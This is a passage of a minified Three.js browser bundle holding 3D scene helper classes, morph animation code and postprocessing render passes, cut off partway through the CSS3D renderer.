THREE.LineBasicMaterial({vertexColors:THREE.VertexColors});THREE.Line.call(this,i,n,THREE.LinePieces)},THREE.AxisHelper.prototype=Object.create(THREE.Line.prototype),THREE.AxisHelper.prototype.constructor=THREE.AxisHelper,THREE.ArrowHelper=function(){var e=new THREE.Geometry;e.vertices.push(new THREE.Vector3(0,0,0),new THREE.Vector3(0,1,0));var t=new THREE.CylinderGeometry(0,.5,1,5,1);return t.applyMatrix((new THREE.Matrix4).makeTranslation(0,-.5,0)),function(r,i,n,a,o,s){THREE.Object3D.call(this),void 0===a&&(a=16776960),void 0===n&&(n=1),void 0===o&&(o=.2*n),void 0===s&&(s=.2*o),this.position.copy(i),this.line=new THREE.Line(e,new THREE.LineBasicMaterial({color:a})),this.line.matrixAutoUpdate=!1,this.add(this.line),this.cone=new THREE.Mesh(t,new THREE.MeshBasicMaterial({color:a})),this.cone.matrixAutoUpdate=!1,this.add(this.cone),this.setDirection(r),this.setLength(n,o,s)}}(),THREE.ArrowHelper.prototype=Object.create(THREE.Object3D.prototype),THREE.ArrowHelper.prototype.constructor=THREE.ArrowHelper,THREE.ArrowHelper.prototype.setDirection=function(){var e,t=new THREE.Vector3;return function(r){r.y>.99999?this.quaternion.set(0,0,0,1):r.y<-.99999?this.quaternion.set(1,0,0,0):(t.set(r.z,0,-r.x).normalize(),e=Math.acos(r.y),this.quaternion.setFromAxisAngle(t,e))}}(),THREE.ArrowHelper.prototype.setLength=function(e,t,r){void 0===t&&(t=.2*e),void 0===r&&(r=.2*t),this.line.scale.set(1,e-t,1),this.line.updateMatrix(),this.cone.scale.set(r,t,r),this.cone.position.y=e,this.cone.updateMatrix()},THREE.ArrowHelper.prototype.setColor=function(e){this.line.material.color.set(e),this.cone.material.color.set(e)},THREE.BoxHelper=function(e){var t=new THREE.BufferGeometry;t.addAttribute("position",new THREE.BufferAttribute(new Float32Array(72),3)),THREE.Line.call(this,t,new THREE.LineBasicMaterial({color:16776960}),THREE.LinePieces),void 0!==e&&this.update(e)},THREE.BoxHelper.prototype=Object.create(THREE.Line.prototype),THREE.BoxHelper.prototype.constructor=THREE.BoxHelper,THREE.BoxHelper.prototype.update=function(e){var t=e.geometry;null===t.boundingBox&&t.computeBoundingBox();var r=t.boundingBox.min,i=t.boundingBox.max,n=this.geometry.attributes.position.array;n[0]=i.x,n[1]=i.y,n[2]=i.z,n[3]=r.x,n[4]=i.y,n[5]=i.z,n[6]=r.x,n[7]=i.y,n[8]=i.z,n[9]=r.x,n[10]=r.y,n[11]=i.z,n[12]=r.x,n[13]=r.y,n[14]=i.z,n[15]=i.x,n[16]=r.y,n[17]=i.z,n[18]=i.x,n[19]=r.y,n[20]=i.z,n[21]=i.x,n[22]=i.y,n[23]=i.z,n[24]=i.x,n[25]=i.y,n[26]=r.z,n[27]=r.x,n[28]=i.y,n[29]=r.z,n[30]=r.x,n[31]=i.y,n[32]=r.z,n[33]=r.x,n[34]=r.y,n[35]=r.z,n[36]=r.x,n[37]=r.y,n[38]=r.z,n[39]=i.x,n[40]=r.y,n[41]=r.z,n[42]=i.x,n[43]=r.y,n[44]=r.z,n[45]=i.x,n[46]=i.y,n[47]=r.z,n[48]=i.x,n[49]=i.y,n[50]=i.z,n[51]=i.x,n[52]=i.y,n[53]=r.z,n[54]=r.x,n[55]=i.y,n[56]=i.z,n[57]=r.x,n[58]=i.y,n[59]=r.z,n[60]=r.x,n[61]=r.y,n[62]=i.z,n[63]=r.x,n[64]=r.y,n[65]=r.z,n[66]=i.x,n[67]=r.y,n[68]=i.z,n[69]=i.x,n[70]=r.y,n[71]=r.z,this.geometry.attributes.position.needsUpdate=!0,this.geometry.computeBoundingSphere(),this.matrix=e.matrixWorld,this.matrixAutoUpdate=!1},THREE.BoundingBoxHelper=function(e,t){var r=void 0!==t?t:8947848;this.object=e,this.box=new THREE.Box3,THREE.Mesh.call(this,new THREE.BoxGeometry(1,1,1),new THREE.MeshBasicMaterial({color:r,wireframe:!0}))},THREE.BoundingBoxHelper.prototype=Object.create(THREE.Mesh.prototype),THREE.BoundingBoxHelper.prototype.constructor=THREE.BoundingBoxHelper,THREE.BoundingBoxHelper.prototype.update=function(){this.box.setFromObject(this.object),this.box.size(this.scale),this.box.center(this.position)},THREE.CameraHelper=function(e){function t(e,t,i){r(e,i),r(t,i)}function r(e,t){i.vertices.push(new THREE.Vector3),i.colors.push(new THREE.Color(t)),void 0===a[e]&&(a[e]=[]),a[e].push(i.vertices.length-1)}var i=new THREE.Geometry,n=new THREE.LineBasicMaterial({color:16777215,vertexColors:THREE.FaceColors}),a={},o=16755200,s=16711680,h=43775,l=16777215,c=3355443;t("n1","n2",o),t("n2","n4",o),t("n4","n3",o),t("n3","n1",o),t("f1","f2",o),t("f2","f4",o),t("f4","f3",o),t("f3","f1",o),t("n1","f1",o),t("n2","f2",o),t("n3","f3",o),t("n4","f4",o),t("p","n1",s),t("p","n2",s),t("p","n3",s),t("p","n4",s),t("u1","u2",h),t("u2","u3",h),t("u3","u1",h),t("c","t",l),t("p","c",c),t("cn1","cn2",c),t("cn3","cn4",c),t("cf1","cf2",c),t("cf3","cf4",c),THREE.Line.call(this,i,n,THREE.LinePieces),this.camera=e,this.matrix=e.matrixWorld,this.matrixAutoUpdate=!1,this.pointMap=a,this.update()},THREE.CameraHelper.prototype=Object.create(THREE.Line.prototype),THREE.CameraHelper.prototype.constructor=THREE.CameraHelper,THREE.CameraHelper.prototype.update=function(){var e,t,r=new THREE.Vector3,i=new THREE.Camera,n=function(n,a,o,s){r.set(a,o,s).unproject(i);var h=t[n];if(void 0!==h)for(var l=0,c=h.length;c>l;l++)e.vertices[h[l]].copy(r)};return function(){e=this.geometry,t=this.pointMap;var r=1,a=1;i.projectionMatrix.copy(this.camera.projectionMatrix),n("c",0,0,-1),n("t",0,0,1),n("n1",-r,-a,-1),n("n2",r,-a,-1),n("n3",-r,a,-1),n("n4",r,a,-1),n("f1",-r,-a,1),n("f2",r,-a,1),n("f3",-r,a,1),n("f4",r,a,1),n("u1",.7*r,1.1*a,-1),n("u2",.7*-r,1.1*a,-1),n("u3",0,2*a,-1),n("cf1",-r,0,1),n("cf2",r,0,1),n("cf3",0,-a,1),n("cf4",0,a,1),n("cn1",-r,0,-1),n("cn2",r,0,-1),n("cn3",0,-a,-1),n("cn4",0,a,-1),e.verticesNeedUpdate=!0}}(),THREE.DirectionalLightHelper=function(e,t){THREE.Object3D.call(this),this.light=e,this.light.updateMatrixWorld(),this.matrix=e.matrixWorld,this.matrixAutoUpdate=!1,t=t||1;var r=new THREE.Geometry;r.vertices.push(new THREE.Vector3(-t,t,0),new THREE.Vector3(t,t,0),new THREE.Vector3(t,-t,0),new THREE.Vector3(-t,-t,0),new THREE.Vector3(-t,t,0));var i=new THREE.LineBasicMaterial({fog:!1});i.color.copy(this.light.color).multiplyScalar(this.light.intensity),this.lightPlane=new THREE.Line(r,i),this.add(this.lightPlane),r=new THREE.Geometry,r.vertices.push(new THREE.Vector3,new THREE.Vector3),i=new THREE.LineBasicMaterial({fog:!1}),i.color.copy(this.light.color).multiplyScalar(this.light.intensity),this.targetLine=new THREE.Line(r,i),this.add(this.targetLine),this.update()},THREE.DirectionalLightHelper.prototype=Object.create(THREE.Object3D.prototype),THREE.DirectionalLightHelper.prototype.constructor=THREE.DirectionalLightHelper,THREE.DirectionalLightHelper.prototype.dispose=function(){this.lightPlane.geometry.dispose(),this.lightPlane.material.dispose(),this.targetLine.geometry.dispose(),this.targetLine.material.dispose()},THREE.DirectionalLightHelper.prototype.update=function(){var e=new THREE.Vector3,t=new THREE.Vector3,r=new THREE.Vector3;return function(){e.setFromMatrixPosition(this.light.matrixWorld),t.setFromMatrixPosition(this.light.target.matrixWorld),r.subVectors(t,e),this.lightPlane.lookAt(r),this.lightPlane.material.color.copy(this.light.color).multiplyScalar(this.light.intensity),this.targetLine.geometry.vertices[1].copy(r),this.targetLine.geometry.verticesNeedUpdate=!0,this.targetLine.material.color.copy(this.lightPlane.material.color)}}(),THREE.EdgesHelper=function(e,t,r){var i=void 0!==t?t:16777215;r=void 0!==r?r:1;var n,a=Math.cos(THREE.Math.degToRad(r)),o=[0,0],s={},h=function(e,t){return e-t},l=["a","b","c"],c=new THREE.BufferGeometry;e.geometry instanceof THREE.BufferGeometry?(n=new THREE.Geometry,n.fromBufferGeometry(e.geometry)):n=e.geometry.clone(),n.mergeVertices(),n.computeFaceNormals();for(var u=n.vertices,E=n.faces,f=0,p=0,d=E.length;d>p;p++)for(var m=E[p],T=0;3>T;T++){o[0]=m[l[T]],o[1]=m[l[(T+1)%3]],o.sort(h);var g=o.toString();void 0===s[g]?(s[g]={vert1:o[0],vert2:o[1],face1:p,face2:void 0},f++):s[g].face2=p}var v=new Float32Array(2*f*3),R=0;for(var g in s){var y=s[g];if(void 0===y.face2||E[y.face1].normal.dot(E[y.face2].normal)<=a){var H=u[y.vert1];v[R++]=H.x,v[R++]=H.y,v[R++]=H.z,H=u[y.vert2],v[R++]=H.x,v[R++]=H.y,v[R++]=H.z}}c.addAttribute("position",new THREE.BufferAttribute(v,3)),THREE.Line.call(this,c,new THREE.LineBasicMaterial({color:i}),THREE.LinePieces),this.matrix=e.matrixWorld,this.matrixAutoUpdate=!1},THREE.EdgesHelper.prototype=Object.create(THREE.Line.prototype),THREE.EdgesHelper.prototype.constructor=THREE.EdgesHelper,THREE.FaceNormalsHelper=function(e,t,r,i){this.object=e,this.size=void 0!==t?t:1;for(var n=void 0!==r?r:16776960,a=void 0!==i?i:1,o=new THREE.Geometry,s=this.object.geometry.faces,h=0,l=s.length;l>h;h++)o.vertices.push(new THREE.Vector3,new THREE.Vector3);THREE.Line.call(this,o,new THREE.LineBasicMaterial({color:n,linewidth:a}),THREE.LinePieces),this.matrixAutoUpdate=!1,this.normalMatrix=new THREE.Matrix3,this.update()},THREE.FaceNormalsHelper.prototype=Object.create(THREE.Line.prototype),THREE.FaceNormalsHelper.prototype.constructor=THREE.FaceNormalsHelper,THREE.FaceNormalsHelper.prototype.update=function(){var e=this.geometry.vertices,t=this.object,r=t.geometry.vertices,i=t.geometry.faces,n=t.matrixWorld;t.updateMatrixWorld(!0),this.normalMatrix.getNormalMatrix(n);for(var a=0,o=0,s=i.length;s>a;a++,o+=2){var h=i[a];e[o].copy(r[h.a]).add(r[h.b]).add(r[h.c]).divideScalar(3).applyMatrix4(n),e[o+1].copy(h.normal).applyMatrix3(this.normalMatrix).normalize().multiplyScalar(this.size).add(e[o])}return this.geometry.verticesNeedUpdate=!0,this},THREE.GridHelper=function(e,t){var r=new THREE.Geometry,i=new THREE.LineBasicMaterial({vertexColors:THREE.VertexColors});this.color1=new THREE.Color(4473924),this.color2=new THREE.Color(8947848);for(var n=-e;e>=n;n+=t){r.vertices.push(new THREE.Vector3(-e,0,n),new THREE.Vector3(e,0,n),new THREE.Vector3(n,0,-e),new THREE.Vector3(n,0,e));var a=0===n?this.color1:this.color2;r.colors.push(a,a,a,a)}THREE.Line.call(this,r,i,THREE.LinePieces)},THREE.GridHelper.prototype=Object.create(THREE.Line.prototype),THREE.GridHelper.prototype.constructor=THREE.GridHelper,THREE.GridHelper.prototype.setColors=function(e,t){this.color1.set(e),this.color2.set(t),this.geometry.colorsNeedUpdate=!0},THREE.HemisphereLightHelper=function(e,t){THREE.Object3D.call(this),this.light=e,this.light.updateMatrixWorld(),this.matrix=e.matrixWorld,this.matrixAutoUpdate=!1,this.colors=[new THREE.Color,new THREE.Color];var r=new THREE.SphereGeometry(t,4,2);r.applyMatrix((new THREE.Matrix4).makeRotationX(-Math.PI/2));for(var i=0,n=8;n>i;i++)r.faces[i].color=this.colors[4>i?0:1];var a=new THREE.MeshBasicMaterial({vertexColors:THREE.FaceColors,wireframe:!0});this.lightSphere=new THREE.Mesh(r,a),this.add(this.lightSphere),this.update()},THREE.HemisphereLightHelper.prototype=Object.create(THREE.Object3D.prototype),THREE.HemisphereLightHelper.prototype.constructor=THREE.HemisphereLightHelper,THREE.HemisphereLightHelper.prototype.dispose=function(){this.lightSphere.geometry.dispose(),this.lightSphere.material.dispose()},THREE.HemisphereLightHelper.prototype.update=function(){var e=new THREE.Vector3;return function(){this.colors[0].copy(this.light.color).multiplyScalar(this.light.intensity),this.colors[1].copy(this.light.groundColor).multiplyScalar(this.light.intensity),this.lightSphere.lookAt(e.setFromMatrixPosition(this.light.matrixWorld).negate()),this.lightSphere.geometry.colorsNeedUpdate=!0}}(),THREE.PointLightHelper=function(e,t){this.light=e,this.light.updateMatrixWorld();var r=new THREE.SphereGeometry(t,4,2),i=new THREE.MeshBasicMaterial({wireframe:!0,fog:!1});i.color.copy(this.light.color).multiplyScalar(this.light.intensity),THREE.Mesh.call(this,r,i),this.matrix=this.light.matrixWorld,this.matrixAutoUpdate=!1},THREE.PointLightHelper.prototype=Object.create(THREE.Mesh.prototype),THREE.PointLightHelper.prototype.constructor=THREE.PointLightHelper,THREE.PointLightHelper.prototype.dispose=function(){this.geometry.dispose(),this.material.dispose()},THREE.PointLightHelper.prototype.update=function(){this.material.color.copy(this.light.color).multiplyScalar(this.light.intensity)},THREE.SkeletonHelper=function(e){this.bones=this.getBoneList(e);for(var t=new THREE.Geometry,r=0;r<this.bones.length;r++){var i=this.bones[r];i.parent instanceof THREE.Bone&&(t.vertices.push(new THREE.Vector3),t.vertices.push(new THREE.Vector3),t.colors.push(new THREE.Color(0,0,1)),t.colors.push(new THREE.Color(0,1,0)))}var n=new THREE.LineBasicMaterial({vertexColors:THREE.VertexColors,depthTest:!1,depthWrite:!1,transparent:!0});THREE.Line.call(this,t,n,THREE.LinePieces),this.root=e,this.matrix=e.matrixWorld,this.matrixAutoUpdate=!1,this.update()},THREE.SkeletonHelper.prototype=Object.create(THREE.Line.prototype),THREE.SkeletonHelper.prototype.constructor=THREE.SkeletonHelper,THREE.SkeletonHelper.prototype.getBoneList=function(e){var t=[];e instanceof THREE.Bone&&t.push(e);for(var r=0;r<e.children.length;r++)t.push.apply(t,this.getBoneList(e.children[r]));return t},THREE.SkeletonHelper.prototype.update=function(){for(var e=this.geometry,t=(new THREE.Matrix4).getInverse(this.root.matrixWorld),r=new THREE.Matrix4,i=0,n=0;n<this.bones.length;n++){var a=this.bones[n];a.parent instanceof THREE.Bone&&(r.multiplyMatrices(t,a.matrixWorld),e.vertices[i].setFromMatrixPosition(r),r.multiplyMatrices(t,a.parent.matrixWorld),e.vertices[i+1].setFromMatrixPosition(r),i+=2)}e.verticesNeedUpdate=!0,e.computeBoundingSphere()},THREE.SpotLightHelper=function(e){THREE.Object3D.call(this),this.light=e,this.light.updateMatrixWorld(),this.matrix=e.matrixWorld,this.matrixAutoUpdate=!1;var t=new THREE.CylinderGeometry(0,1,1,8,1,!0);t.applyMatrix((new THREE.Matrix4).makeTranslation(0,-.5,0)),t.applyMatrix((new THREE.Matrix4).makeRotationX(-Math.PI/2));var r=new THREE.MeshBasicMaterial({wireframe:!0,fog:!1});this.cone=new THREE.Mesh(t,r),this.add(this.cone),this.update()},THREE.SpotLightHelper.prototype=Object.create(THREE.Object3D.prototype),THREE.SpotLightHelper.prototype.constructor=THREE.SpotLightHelper,THREE.SpotLightHelper.prototype.dispose=function(){this.cone.geometry.dispose(),this.cone.material.dispose()},THREE.SpotLightHelper.prototype.update=function(){var e=new THREE.Vector3,t=new THREE.Vector3;return function(){var r=this.light.distance?this.light.distance:1e4,i=r*Math.tan(this.light.angle);this.cone.scale.set(i,i,r),e.setFromMatrixPosition(this.light.matrixWorld),t.setFromMatrixPosition(this.light.target.matrixWorld),this.cone.lookAt(t.sub(e)),this.cone.material.color.copy(this.light.color).multiplyScalar(this.light.intensity)}}(),THREE.VertexNormalsHelper=function(e,t,r,i){this.object=e,this.size=void 0!==t?t:1;for(var n=void 0!==r?r:16711680,a=void 0!==i?i:1,o=new THREE.Geometry,s=e.geometry.faces,h=0,l=s.length;l>h;h++)for(var c=s[h],u=0,E=c.vertexNormals.length;E>u;u++)o.vertices.push(new THREE.Vector3,new THREE.Vector3);THREE.Line.call(this,o,new THREE.LineBasicMaterial({color:n,linewidth:a}),THREE.LinePieces),this.matrixAutoUpdate=!1,this.normalMatrix=new THREE.Matrix3,this.update()},THREE.VertexNormalsHelper.prototype=Object.create(THREE.Line.prototype),THREE.VertexNormalsHelper.prototype.constructor=THREE.VertexNormalsHelper,THREE.VertexNormalsHelper.prototype.update=function(e){var t=new THREE.Vector3;return function(e){var r=["a","b","c","d"];this.object.updateMatrixWorld(!0),this.normalMatrix.getNormalMatrix(this.object.matrixWorld);for(var i=this.geometry.vertices,n=this.object.geometry.vertices,a=this.object.geometry.faces,o=this.object.matrixWorld,s=0,h=0,l=a.length;l>h;h++)for(var c=a[h],u=0,E=c.vertexNormals.length;E>u;u++){var f=c[r[u]],p=n[f],d=c.vertexNormals[u];i[s].copy(p).applyMatrix4(o),t.copy(d).applyMatrix3(this.normalMatrix).normalize().multiplyScalar(this.size),t.add(i[s]),s+=1,i[s].copy(t),s+=1}return this.geometry.verticesNeedUpdate=!0,this}}(),THREE.VertexTangentsHelper=function(e,t,r,i){this.object=e,this.size=void 0!==t?t:1;for(var n=void 0!==r?r:255,a=void 0!==i?i:1,o=new THREE.Geometry,s=e.geometry.faces,h=0,l=s.length;l>h;h++)for(var c=s[h],u=0,E=c.vertexTangents.length;E>u;u++)o.vertices.push(new THREE.Vector3),o.vertices.push(new THREE.Vector3);THREE.Line.call(this,o,new THREE.LineBasicMaterial({color:n,linewidth:a}),THREE.LinePieces),this.matrixAutoUpdate=!1,this.update()},THREE.VertexTangentsHelper.prototype=Object.create(THREE.Line.prototype),THREE.VertexTangentsHelper.prototype.constructor=THREE.VertexTangentsHelper,THREE.VertexTangentsHelper.prototype.update=function(e){var t=new THREE.Vector3;return function(e){var r=["a","b","c","d"];this.object.updateMatrixWorld(!0);for(var i=this.geometry.vertices,n=this.object.geometry.vertices,a=this.object.geometry.faces,o=this.object.matrixWorld,s=0,h=0,l=a.length;l>h;h++)for(var c=a[h],u=0,E=c.vertexTangents.length;E>u;u++){var f=c[r[u]],p=n[f],d=c.vertexTangents[u];i[s].copy(p).applyMatrix4(o),t.copy(d).transformDirection(o).multiplyScalar(this.size),t.add(i[s]),s+=1,i[s].copy(t),s+=1}return this.geometry.verticesNeedUpdate=!0,this}}(),THREE.WireframeHelper=function(e,t){var r=void 0!==t?t:16777215,i=[0,0],n={},a=function(e,t){return e-t},o=["a","b","c"],s=new THREE.BufferGeometry;if(e.geometry instanceof THREE.Geometry){for(var h=e.geometry.vertices,l=e.geometry.faces,c=0,u=new Uint32Array(6*l.length),E=0,f=l.length;f>E;E++)for(var p=l[E],d=0;3>d;d++){i[0]=p[o[d]],i[1]=p[o[(d+1)%3]],i.sort(a);var m=i.toString();void 0===n[m]&&(u[2*c]=i[0],u[2*c+1]=i[1],n[m]=!0,c++)}for(var T=new Float32Array(2*c*3),E=0,f=c;f>E;E++)for(var d=0;2>d;d++){var g=h[u[2*E+d]],v=6*E+3*d;T[v+0]=g.x,T[v+1]=g.y,T[v+2]=g.z}s.addAttribute("position",new THREE.BufferAttribute(T,3))}else if(e.geometry instanceof THREE.BufferGeometry)if(void 0!==e.geometry.attributes.index){var h=e.geometry.attributes.position.array,R=e.geometry.attributes.index.array,y=e.geometry.drawcalls,c=0;0===y.length&&(y=[{count:R.length,index:0,start:0}]);for(var u=new Uint32Array(2*R.length),H=0,x=y.length;x>H;++H)for(var b=y[H].start,_=y[H].count,v=y[H].index,E=b,w=b+_;w>E;E+=3)for(var d=0;3>d;d++){i[0]=v+R[E+d],i[1]=v+R[E+(d+1)%3],i.sort(a);var m=i.toString();void 0===n[m]&&(u[2*c]=i[0],u[2*c+1]=i[1],n[m]=!0,c++)}for(var T=new Float32Array(2*c*3),E=0,f=c;f>E;E++)for(var d=0;2>d;d++){var v=6*E+3*d,M=3*u[2*E+d];T[v+0]=h[M],T[v+1]=h[M+1],T[v+2]=h[M+2]}s.addAttribute("position",new THREE.BufferAttribute(T,3))}else{for(var h=e.geometry.attributes.position.array,c=h.length/3,S=c/3,T=new Float32Array(2*c*3),E=0,f=S;f>E;E++)for(var d=0;3>d;d++){var v=18*E+6*d,A=9*E+3*d;T[v+0]=h[A],T[v+1]=h[A+1],T[v+2]=h[A+2];var M=9*E+3*((d+1)%3);T[v+3]=h[M],
T[v+4]=h[M+1],T[v+5]=h[M+2]}s.addAttribute("position",new THREE.BufferAttribute(T,3))}THREE.Line.call(this,s,new THREE.LineBasicMaterial({color:r}),THREE.LinePieces),this.matrix=e.matrixWorld,this.matrixAutoUpdate=!1},THREE.WireframeHelper.prototype=Object.create(THREE.Line.prototype),THREE.WireframeHelper.prototype.constructor=THREE.WireframeHelper,THREE.ImmediateRenderObject=function(){THREE.Object3D.call(this),this.render=function(e){}},THREE.ImmediateRenderObject.prototype=Object.create(THREE.Object3D.prototype),THREE.ImmediateRenderObject.prototype.constructor=THREE.ImmediateRenderObject,THREE.MorphBlendMesh=function(e,t){THREE.Mesh.call(this,e,t),this.animationsMap={},this.animationsList=[];var r=this.geometry.morphTargets.length,i="__default",n=0,a=r-1,o=r/1;this.createAnimation(i,n,a,o),this.setAnimationWeight(i,1)},THREE.MorphBlendMesh.prototype=Object.create(THREE.Mesh.prototype),THREE.MorphBlendMesh.prototype.constructor=THREE.MorphBlendMesh,THREE.MorphBlendMesh.prototype.createAnimation=function(e,t,r,i){var n={startFrame:t,endFrame:r,length:r-t+1,fps:i,duration:(r-t)/i,lastFrame:0,currentFrame:0,active:!1,time:0,direction:1,weight:1,directionBackwards:!1,mirroredLoop:!1};this.animationsMap[e]=n,this.animationsList.push(n)},THREE.MorphBlendMesh.prototype.autoCreateAnimations=function(e){for(var t,r=/([a-z]+)_?(\d+)/,i={},n=this.geometry,a=0,o=n.morphTargets.length;o>a;a++){var s=n.morphTargets[a],h=s.name.match(r);if(h&&h.length>1){var l=h[1];i[l]||(i[l]={start:1/0,end:-(1/0)});var c=i[l];a<c.start&&(c.start=a),a>c.end&&(c.end=a),t||(t=l)}}for(var l in i){var c=i[l];this.createAnimation(l,c.start,c.end,e)}this.firstAnimation=t},THREE.MorphBlendMesh.prototype.setAnimationDirectionForward=function(e){var t=this.animationsMap[e];t&&(t.direction=1,t.directionBackwards=!1)},THREE.MorphBlendMesh.prototype.setAnimationDirectionBackward=function(e){var t=this.animationsMap[e];t&&(t.direction=-1,t.directionBackwards=!0)},THREE.MorphBlendMesh.prototype.setAnimationFPS=function(e,t){var r=this.animationsMap[e];r&&(r.fps=t,r.duration=(r.end-r.start)/r.fps)},THREE.MorphBlendMesh.prototype.setAnimationDuration=function(e,t){var r=this.animationsMap[e];r&&(r.duration=t,r.fps=(r.end-r.start)/r.duration)},THREE.MorphBlendMesh.prototype.setAnimationWeight=function(e,t){var r=this.animationsMap[e];r&&(r.weight=t)},THREE.MorphBlendMesh.prototype.setAnimationTime=function(e,t){var r=this.animationsMap[e];r&&(r.time=t)},THREE.MorphBlendMesh.prototype.getAnimationTime=function(e){var t=0,r=this.animationsMap[e];return r&&(t=r.time),t},THREE.MorphBlendMesh.prototype.getAnimationDuration=function(e){var t=-1,r=this.animationsMap[e];return r&&(t=r.duration),t},THREE.MorphBlendMesh.prototype.playAnimation=function(e){var t=this.animationsMap[e];t?(t.time=0,t.active=!0):THREE.warn("THREE.MorphBlendMesh: animation["+e+"] undefined in .playAnimation()")},THREE.MorphBlendMesh.prototype.stopAnimation=function(e){var t=this.animationsMap[e];t&&(t.active=!1)},THREE.MorphBlendMesh.prototype.update=function(e){for(var t=0,r=this.animationsList.length;r>t;t++){var i=this.animationsList[t];if(i.active){var n=i.duration/i.length;i.time+=i.direction*e,i.mirroredLoop?(i.time>i.duration||i.time<0)&&(i.direction*=-1,i.time>i.duration&&(i.time=i.duration,i.directionBackwards=!0),i.time<0&&(i.time=0,i.directionBackwards=!1)):(i.time=i.time%i.duration,i.time<0&&(i.time+=i.duration));var a=i.startFrame+THREE.Math.clamp(Math.floor(i.time/n),0,i.length-1),o=i.weight;a!==i.currentFrame&&(this.morphTargetInfluences[i.lastFrame]=0,this.morphTargetInfluences[i.currentFrame]=1*o,this.morphTargetInfluences[a]=0,i.lastFrame=i.currentFrame,i.currentFrame=a);var s=i.time%n/n;i.directionBackwards&&(s=1-s),this.morphTargetInfluences[i.currentFrame]=s*o,this.morphTargetInfluences[i.lastFrame]=(1-s)*o}}};
},{}],130:[function(require,module,exports){
THREE.EffectComposer=function(e,r){if(this.renderer=e,void 0===r){var t=e.getPixelRatio(),s=Math.floor(e.context.canvas.width/t)||1,i=Math.floor(e.context.canvas.height/t)||1,a={minFilter:THREE.LinearFilter,magFilter:THREE.LinearFilter,format:THREE.RGBAFormat,stencilBuffer:!1};r=new THREE.WebGLRenderTarget(s,i,a)}this.renderTarget1=r,this.renderTarget2=r.clone(),this.writeBuffer=this.renderTarget1,this.readBuffer=this.renderTarget2,this.passes=[],void 0===THREE.CopyShader&&console.error("THREE.EffectComposer relies on THREE.CopyShader"),this.copyPass=new THREE.ShaderPass(THREE.CopyShader)},THREE.EffectComposer.prototype={swapBuffers:function(){var e=this.readBuffer;this.readBuffer=this.writeBuffer,this.writeBuffer=e},addPass:function(e){this.passes.push(e)},insertPass:function(e,r){this.passes.splice(r,0,e)},render:function(e){this.writeBuffer=this.renderTarget1,this.readBuffer=this.renderTarget2;var r,t,s=!1,i=this.passes.length;for(t=0;i>t;t++)if(r=this.passes[t],r.enabled){if(r.render(this.renderer,this.writeBuffer,this.readBuffer,e,s),r.needsSwap){if(s){var a=this.renderer.context;a.stencilFunc(a.NOTEQUAL,1,4294967295),this.copyPass.render(this.renderer,this.writeBuffer,this.readBuffer,e),a.stencilFunc(a.EQUAL,1,4294967295)}this.swapBuffers()}r instanceof THREE.MaskPass?s=!0:r instanceof THREE.ClearMaskPass&&(s=!1)}},reset:function(e){if(void 0===e){e=this.renderTarget1.clone();var r=this.renderer.getPixelRatio();e.width=Math.floor(this.renderer.context.canvas.width/r),e.height=Math.floor(this.renderer.context.canvas.height/r)}this.renderTarget1=e,this.renderTarget2=e.clone(),this.writeBuffer=this.renderTarget1,this.readBuffer=this.renderTarget2},setSize:function(e,r){var t=this.renderTarget1.clone();t.width=e,t.height=r,this.reset(t)}};
},{}],131:[function(require,module,exports){
THREE.MaskPass=function(e,s){this.scene=e,this.camera=s,this.enabled=!0,this.clear=!0,this.needsSwap=!1,this.inverse=!1},THREE.MaskPass.prototype={render:function(e,s,t,a){var n=e.context;n.colorMask(!1,!1,!1,!1),n.depthMask(!1);var i,r;this.inverse?(i=0,r=1):(i=1,r=0),n.enable(n.STENCIL_TEST),n.stencilOp(n.REPLACE,n.REPLACE,n.REPLACE),n.stencilFunc(n.ALWAYS,i,4294967295),n.clearStencil(r),e.render(this.scene,this.camera,t,this.clear),e.render(this.scene,this.camera,s,this.clear),n.colorMask(!0,!0,!0,!0),n.depthMask(!0),n.stencilFunc(n.EQUAL,1,4294967295),n.stencilOp(n.KEEP,n.KEEP,n.KEEP)}},THREE.ClearMaskPass=function(){this.enabled=!0},THREE.ClearMaskPass.prototype={render:function(e,s,t,a){var n=e.context;n.disable(n.STENCIL_TEST)}};
},{}],132:[function(require,module,exports){
THREE.RenderPass=function(e,r,l,a,o){this.scene=e,this.camera=r,this.overrideMaterial=l,this.clearColor=a,this.clearAlpha=void 0!==o?o:1,this.oldClearColor=new THREE.Color,this.oldClearAlpha=1,this.enabled=!0,this.clear=!0,this.needsSwap=!1},THREE.RenderPass.prototype={render:function(e,r,l,a){this.scene.overrideMaterial=this.overrideMaterial,this.clearColor&&(this.oldClearColor.copy(e.getClearColor()),this.oldClearAlpha=e.getClearAlpha(),e.setClearColor(this.clearColor,this.clearAlpha)),e.render(this.scene,this.camera,l,this.clear),this.clearColor&&e.setClearColor(this.oldClearColor,this.oldClearAlpha),this.scene.overrideMaterial=null}};
},{}],133:[function(require,module,exports){
THREE.ShaderPass=function(e,r){this.textureID=void 0!==r?r:"tDiffuse",this.uniforms=THREE.UniformsUtils.clone(e.uniforms),this.material=new THREE.ShaderMaterial({defines:e.defines||{},uniforms:this.uniforms,vertexShader:e.vertexShader,fragmentShader:e.fragmentShader}),this.renderToScreen=!1,this.enabled=!0,this.needsSwap=!0,this.clear=!1,this.camera=new THREE.OrthographicCamera(-1,1,1,-1,0,1),this.scene=new THREE.Scene,this.quad=new THREE.Mesh(new THREE.PlaneBufferGeometry(2,2),null),this.scene.add(this.quad)},THREE.ShaderPass.prototype={render:function(e,r,t,s){this.uniforms[this.textureID]&&(this.uniforms[this.textureID].value=t),this.quad.material=this.material,this.renderToScreen?e.render(this.scene,this.camera):e.render(this.scene,this.camera,r,this.clear)}};
},{}],134:[function(require,module,exports){
THREE.CSS3DObject=function(e){THREE.Object3D.call(this),this.element=e,this.element.style.position="absolute",this.addEventListener("removed",function(e){null!==this.element.parentNode&&this.element.parentNode.removeChild(this.element)})},THREE.CSS3DObject.prototype=Object.create(THREE.Object3D.prototype),THREE.CSS3DObject.prototype.constructor=THREE.CSS3DObject,THREE.CSS3DSprite=function(e){THREE.CSS3DObject.call(this,e)},THREE.CSS3DSprite.prototype=Object.create(THREE.CSS3DObject.prototype),THREE.CSS3DSprite.prototype.constructor=THREE.CSS3DSprite,THREE.CSS3DRenderer=function(){console.log("THREE.CSS3DRenderer",THREE.REVISION);var e,t,r,s,o=new THREE.Matrix4,n={camera:{fov:0,style:""},objects:{}},l=document.createElement("div");l.style.overflow="hidden",l.style.WebkitTransformStyle="preserve-3d",l.style.MozTransformStyle="preserve-3d",l.style.oTransformStyle="preserve-3d",l.style.transformStyle="preserve-3d",this.domElement=l;var 